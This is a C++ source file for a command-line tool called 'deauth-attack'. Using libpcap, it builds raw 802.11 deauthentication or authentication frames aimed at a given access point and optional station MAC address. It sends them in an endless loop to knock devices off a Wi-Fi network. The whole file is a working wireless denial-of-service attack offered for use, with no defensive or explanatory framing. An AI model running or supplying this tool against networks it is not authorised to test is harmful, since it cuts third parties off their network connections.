#include "proto_structures.h"
#include <iostream>
#include <pcap.h>
#include <unistd.h>
//#include "pdebug.h"
using std::cout;
using std::endl;
uint8_t deauth[]={
	0x00,0x00,0x0b,0x00,0x00,0x80,0x02,0x00, 0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0xff,
	0xff,0xff,0xff,0xff,0xff,0x99,0x00,0x00, 0x00,0x00,0x88,0x99,0x00,0x00,0x00,0x00,
	0x88,0x00,0x00,0x07,0x00
};
uint8_t deauth_[]={
	0x00,0x00,0x0c,0x00,0x04,0x80,0x00,0x00, 0x02,0x00,0x18,0x00,0xc0,0x00,0x3a,0x01,0xff,
	0xff,0xff,0xff,0xff,0xff,0x99,0x00,0x00, 0x00,0x00,0x88,0x99,0x00,0x00,0x00,0x00,
	0x88,0x00,0x00,0x07,0x00
};
uint16_t* xpt=(uint16_t*)&deauth[0x21],* xpt_=(uint16_t*)&deauth_[0x22];
pcap_t* handle;
mac_addr ap;
mac_addr station;
bool auth;

int main(int c,char**v){
	if(c<3||c>5){
		cout<<"usage : deauth-attack <interface> <ap mac> [<station mac> [-auth]]"<<endl;
		exit(1);
	}
	auth=c==5;
	ap=v[2];
	if(c>3)station=v[3];
	char errbuf[PCAP_ERRBUF_SIZE];
	handle=pcap_open_live(v[1],BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		cout<<"pcap : "<<errbuf<<endl;
		exit(1);
	}
	for(auto de:{deauth,deauth_+1})
		if(auth){
			de[0x0b]=0xb0;
			memcpy(de+0x0f,&ap,6);
			memcpy(de+0x15,&station,6);
			memcpy(de+0x1b,&ap,6);
		}
		else{
			memcpy(de+0x15,&ap,6);
			memcpy(de+0x1b,&ap,6);
			if(c>3)memcpy(de+0x0f,&station,6);
		}
	for(;;usleep(100000))for(int i=0;i<256;i++){
		*xpt_=*xpt=i<<4;
		
		if(pcap_sendpacket(handle,deauth,sizeof deauth)||
		  pcap_sendpacket(handle,deauth_,sizeof deauth_)){
			cout<<"pcap_sendpacket"<<endl;
			exit(1);
		}
	}
	return 0;
}
